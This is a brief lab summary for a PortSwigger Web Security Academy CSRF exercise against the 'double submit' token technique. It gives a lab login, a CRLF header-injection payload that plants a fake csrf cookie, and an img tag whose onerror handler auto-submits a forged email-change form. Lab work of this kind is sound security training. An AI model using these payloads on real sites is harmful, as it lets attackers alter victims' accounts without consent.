## CSRF where token is duplicated in cookie

**Category:** csrf
**Difficulty:** Unknown

### Description
This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

### Solution Steps
You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

### Key Payloads
- `wiener:peter`
- `csrf`
- `/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None`
- `<script>`
- `<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>`

### Indicators of Success
- State-changing action performed without user consent
- No CSRF token required or token bypassable
- Forged request accepted by server
- Victim's account modified via attacker page
- SameSite cookie restrictions bypassed
---
*Source: PortSwigger Web Security Academy*
